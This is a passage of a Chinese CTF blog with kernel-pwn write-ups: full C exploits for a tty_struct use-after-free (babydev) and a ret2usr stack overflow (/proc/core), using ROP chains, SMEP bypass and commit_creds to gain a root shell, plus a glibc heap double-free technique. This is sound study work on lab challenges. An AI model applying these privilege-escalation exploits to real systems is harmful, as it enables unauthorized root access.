class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL  </span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);  </span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);  </span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);  </span><br><span class="line">&#125; __randomize_layout;  </span><br></pre></td></tr></table></figure>

<h2 id="0x3-脚本"><a href="#0x3-脚本" class="headerlink" title="0x3 脚本"></a>0x3 脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_creds=<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* fake_tty_operatios[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">            (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_creds))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff810d238d</span>; <span class="comment">//pop rdi ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81004d80</span>;<span class="comment">//mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++]=<span class="number">0xffffffff81063694</span>;<span class="comment">//swapgs ; pop rbp ; ret</span></span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0xFFFFFFFF8181A797</span>;<span class="comment">//iretq</span></span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i++)&#123;</span><br><span class="line">        fake_tty_operatios[i]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">////mov rsp, rax;dec ebx;ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operatios[<span class="number">0</span>]=<span class="number">0xffffffff810635f5</span>;<span class="comment">//pop rax; pop rbp; ret</span></span><br><span class="line">    fake_tty_operatios[<span class="number">1</span>]=(<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operatios[<span class="number">3</span>]=<span class="number">0xFFFFFFFF8181BFC5</span>;<span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    <span class="keyword">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> fd_tty=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=(<span class="keyword">size_t</span>)fake_tty_operatios;</span><br><span class="line">    write(fd2,fake_tty_struct,<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty,buf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x4-最终效果"><a href="#0x4-最终效果" class="headerlink" title="0x4 最终效果"></a>0x4 最终效果</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin      etc      flag     init     proc     sys</span><br><span class="line">da.sh    exp      gadget   lib      root     tmp</span><br><span class="line">dev      exp.c    home     linuxrc  sbin     usr</span><br><span class="line">/ $ cat flag</span><br><span class="line">cat: can&#x27;t open &#x27;flag&#x27;: Permission denied</span><br><span class="line">/ $ ./exp</span><br><span class="line">[   16.387072] device open</span><br><span class="line">[   16.388872] device open</span><br><span class="line">[   16.390499] alloc done</span><br><span class="line">[   16.392086] device release</span><br><span class="line">/ # cat flag</span><br><span class="line">falg&#123;123&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x5-思考"><a href="#0x5-思考" class="headerlink" title="0x5 思考"></a>0x5 思考</h2><p>rop布置在内核态和用户态有很大的区别，当布置在内核态的时候，如果组成rop的gadget全是内核gadget的时候，就不会触发semep和smap，但是如果布置在用户态的时候，就算全部是内核态的gadget,也会触发smap,因为每次ret的时候都会访问用户态数据拿到地址，就触发smap了，至于为什么不触发smep,因为全程都没有执行用户态代码。</p>
<h2 id="0x6-总结"><a href="#0x6-总结" class="headerlink" title="0x6 总结"></a>0x6 总结</h2><p><strong>iretq</strong>:指令则用来恢复用户态的 cs、ss、rsp、rip、rflags，恢复的时候的布局如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|    RIP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    CS     |</span><br><span class="line">+-----------+</span><br><span class="line">|   rflags  |</span><br><span class="line">+-----------+</span><br><span class="line">|    RSP    |</span><br><span class="line">+-----------+</span><br><span class="line">|    SS     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>

<p>可见这条指令会直接改变rip的值，当这条指令执行完之后会去执行rip处的指令，假如rip处是get_shell的函数地址，这条指令完就直接执行get_shell函数了，所以不用<code>iretq;ret</code>，直接<code>iretq</code>就可以返回用户态并执行get_shell了。</p>
<p><strong>gadget</strong>:使用ropper寻找gadget是最合适的。</p>
<p><strong>函数偏移量</strong>:比如这道题解出来的vmlinux好像没有符号表，所以无法通过pwn直接得到偏移量，这时可以让内核运行起来，然后通过这行shell得到某个内核函数的地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms|grep &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/ret2user/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/ret2user/" class="post-title-link" itemprop="url">ret2user</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-12 01:59:09 / 修改时间：02:01:40" itemprop="dateCreated datePublished" datetime="2022-03-12T01:59:09+08:00">2022-03-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h1><p>古老的手法，一般是在没开semp的情况下，用户空间不能访问内核态，内核态可以直接执行内核态的代码，所以可以在用户态写上提权代码，然后内核态访问这段代码，最后返回用户态执行执行system(“/bin/sh”);</p>
<p>注意不要直接在内核态执行system(“/bin/sh”)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege_escalation</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">        (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))(</span><br><span class="line">            (*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] =(<span class="keyword">size_t</span>)privilege_escalation;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里记录一下自己写的打包和解包的shell脚本</p>
<p>解包 命令行第一个参数是相对于rootfs文件夹cpio的相对路径，第二个参数是在rootfs文件中储存cpio文件的文件名，注意如果cpio文件是压缩包形式，那先解压缩，然后再执行shell脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">mv $1 $2</span><br><span class="line">cpio -idmv &lt; $2</span><br><span class="line">mv $2 $1</span><br></pre></td></tr></table></figure>

<p>打包 第一个参数是储存cpio文件相对路径。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; $1</span><br></pre></td></tr></table></figure>

<p>一般情况下挺好用的，但有时候题目会给打包和解包文件，注意使用题目给的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/07/VNCTF-pwn1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/07/VNCTF-pwn1/" class="post-title-link" itemprop="url">VNCTF pwn1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-07 22:24:19 / 修改时间：22:57:56" itemprop="dateCreated datePublished" datetime="2022-03-07T22:24:19+08:00">2022-03-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="VNCTF-pwn1"><a href="#VNCTF-pwn1" class="headerlink" title="VNCTF pwn1"></a>VNCTF pwn1</h1><p>这道题鸽了有半个多月了，终于把他做完了，当时是全场零解的题，看官方wp的时候有200多行的代码，看得我头皮发麻，幸好后面找见了个比较简单的wp，但这个wp就是简略的说了一下过程，还有我没有见过的stderr利用（不懂为什么不可以使用stdout），后面实验一下</p>
<p>这道题的代码量挺少的，主要逻辑是两个数组储存对的地址和堆的大小，在申请的时候会对size数组遍历检查，如果为0在此处储存新堆块的大小，对应地址数组的偏移储存地址，在free的时候不会检查地址数组，只检查size数组，然后free完不会清除地址，只清除size,导致可以doublefree,如果申请的时候idx是指定的就很方便了，但是这个不是指定的，而是遍历size数组的，况且是2.31的glibc，单纯doublefree是不行的，我们得通过doublefree构造UAF，通过doublefree构造UAF的方式先free一次，在申请出来，然后再free一次，这样就构成了UAF，为了不覆盖堆地址，所以需要doublefree的idx在后面才行（当时没想到，笨）。</p>
<p>我感觉这道题的精华就是把一个堆同时放到tcache和unsortedbin上面，这样tcache的fd就有了libc地址了，然后使用UAF进行爆破（有leak就不用这么麻烦了）。</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>先在flag附近申请一个指定的堆块，然后利用UAF打global_max_fast,然后把这个堆块free到stderr的write_base上面，再利用UAF打stderr，修改flag和write_base的最后一个字节，至于为什么要改，因为这个堆的地址大于储存flag的地址，所以得改小，最后修改topchunk的size的大小和prev_size(0),最后申请一个大堆块，就会触发io_new_file_xsputn,这个函数在stdout就介绍过了，里面有一个sys_write()函数，只要file结构体的flag满足条件就行，这样就有了io函数了，就能输出flag值了。</p>
<p>这是我写的脚本</p>
